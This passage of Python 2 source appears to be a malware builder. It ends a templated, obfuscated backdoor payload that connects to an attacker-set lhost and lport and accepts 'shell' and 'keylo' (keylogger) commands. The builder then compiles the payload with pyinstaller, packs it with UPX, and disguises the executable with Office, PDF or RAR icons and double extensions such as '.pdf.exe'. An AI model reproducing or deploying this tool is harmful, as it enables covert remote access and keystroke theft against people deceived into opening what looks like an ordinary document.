True:\r\n\tb20931ee7fdb6ce1d139ad1b6df35ae4=b3c7cbace395d8b182dbb7ae2c3bfb34.recv(5)\r\n\tif b20931ee7fdb6ce1d139ad1b6df35ae4==\'close\':\r\n\t\texit()\r\n\telif b20931ee7fdb6ce1d139ad1b6df35ae4==\'shell\':\r\n\t\tbedc6d1c31802fb5f8093a2a0fbe7f1d(b3c7cbace395d8b182dbb7ae2c3bfb34)\r\n\telif b20931ee7fdb6ce1d139ad1b6df35ae4==\'keylo\':\r\n\t\tccc744da9691d16696acdc7648b21c89=b3c7cbace395d8b182dbb7ae2c3bfb34.recv(1)\r\n\t\tif ccc744da9691d16696acdc7648b21c89==\'y\':\r\n\t\t\tcefda4932d283cb7f67b9f73fb6e0f14()\r\n'.format(lhost,lport)
        icon_path=raw_input(Fore.GREEN+'Enter Path Icon(Just *.ico)-> ')
        format_outf=''
        licen_ico=False
        if icon_path=='':
            key_icon={'0':['icons\\excel.ico','.xlsx']
                      ,'1':['icons\\pdf.ico','.pdf']
                      ,'2':['icons\\powerpoint.ico','.pptx']
                      ,'3':['icons\\rar.ico','.rar']
                      ,'4':['icons\\word.ico','.docx']}
            print Fore.WHITE+"\nID\tName"
            print Fore.WHITE+"===\t===="
            for sii in range(0,5):
                print "{}[{}]\t{}{}".format(Fore.GREEN,sii,Fore.BLUE,key_icon[str(sii)][0].replace('icons\\',''))
            print
            icon_select=raw_input(Fore.CYAN+'SELECT> ')
            if icon_select in key_icon:
                icon_path=key_icon[icon_select][0]
                licen_ico=True
            else:
                print "\nInvalid ID\n"
                print "Default ICON : PYTHON\n"
                icon_path='\"\"'
        else:
            if path.isfile(icon_path)==True:
                if icon_path[-3:]=='ico':
                    print Fore.RED+'\nICON : '+icon_path
                else:
                    print 'It Is Not .ico'
                    print Fore.RED+'\nDefault ICON : PYTHON\n'
                    icon_path='\"\"'
            elif os.path.isfile(icon_path)==False:
                print 'It Is Not .ico'
                print Fore.RED+'\nDefault ICON : PYTHON\n'
                icon_path='\"\"'
        print Fore.WHITE+'\nSTART Create EXE File'
        print Fore.BLUE+'---------------------'
        file_st=open(payload_name+'.py','wb')
        file_st.write(source_payload)
        file_st.close()
        popen('attrib +h '+payload_name+'.py')
        popen('pyinstaller --onefile '+payload_name+'.py -i '+icon_path+' --onefile').read()
        popen('attrib -h '+payload_name+'.py')
        popen('del /Q '+payload_name+'.py').read()
        popen('del /Q '+payload_name+'.spec').read()
        popen('rmdir /Q /S build').read()
        popen('tools\\upx.exe dist\\'+payload_name+'.exe')
        if licen_ico==True:
            new_ren=payload_name+key_icon[icon_select][1]+'.exe'
            popen('ren dist\\'+payload_name+'.exe '+new_ren)
            if path.isfile('dist/'+new_ren)==True:
                print Fore.RED+'Save -> dist/'+new_ren
            else:
                print Back.RED+"Can\'t Create File"
        else:
            if path.isfile('dist/'+payload_name+'.exe')==True:
                print Fore.RED+'Save -> dist/'+payload_name+'.exe'
            else:
                print Back.RED+"Can\'t Create File"
        print Fore.BLUE+'---------------------'
    else:
        banner()
